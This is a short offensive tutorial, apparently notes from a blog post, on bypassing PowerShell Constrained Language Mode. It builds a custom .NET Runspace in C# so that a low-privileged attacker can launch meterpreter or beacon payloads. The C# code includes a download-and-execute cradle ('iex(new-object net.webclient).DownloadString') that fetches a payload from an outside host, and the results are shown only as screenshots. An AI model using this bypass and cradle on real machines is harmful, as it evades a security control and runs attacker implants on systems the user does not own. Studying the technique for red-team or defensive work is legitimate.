PowerShell Constrained Language is a [language mode](https://blogs.msdn.microsoft.com/powershell/2017/04/10/a-comparison-of-shell-and-scripting-language-security/?ref=secjuice.com) of PowerShell designed to support day-to-day administrative tasks, yet  restrict access to sensitive language elements that can be used to  invoke arbitrary Windows APIs. Suppose we have a shell as a low-priv user at a helpdesk and need to execute a payload for meterpreter or beacon.
 
![](Pasted%20image%2020241102011802.png)

even on disk:
![](Pasted%20image%2020241102011819.png)


## .NET Runspaces
Runspaces helps in creating another instance of Powershell. Each powershell session you use is said to be a runspace. Using runspaces you can create a parallel instance and execute your commands through it. The powershell CLI is just an interpreter of the .NET assembly, so it's perfectly possible to create our own. So, lets create one. :)

![](Pasted%20image%2020241102011842.png)

- Make sure you have System.Automation.Management.dll added to the project.
```
Runspace run = RunspaceFactory.CreateRunspace();
run.Open();
```

- The [RunspaceFactory.](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.runspacefactory?view=powershellsdk-1.1.0&ref=secjuice.com)Create() method helps in creating a new instance of the Runspace named run.
```
PowerShell shell = PowerShell.Create();
shell.Runspace = run;
```

- The [PowerShell](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.powershell?view=powershellsdk-1.1.0&ref=secjuice.com) shell object is created and our Runspace "run" is set as it's runspace.
```
String exec = "iex(new-object net.webclient).DownloadString('http://192.168.0.104/payload')";
shell.AddScript(exec);
shell.Invoke();
```

We assign our desired command to exec, then use AddScript() to add it to the pipeline and execute it using Invoke(). Keep in mind that there's no output from our code and it's blind for now. Let's run it on the target and see if we succeed.

![](Pasted%20image%2020241102012001.png)

Lets try to see what's the LanguageMode of the created RunSpace:
![](Pasted%20image%2020241102012023.png)

I modified the script a bit to return the commands output to a collection and print it out. Let's see what's up now.
![](Pasted%20image%2020241102012043.png)


more on : https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/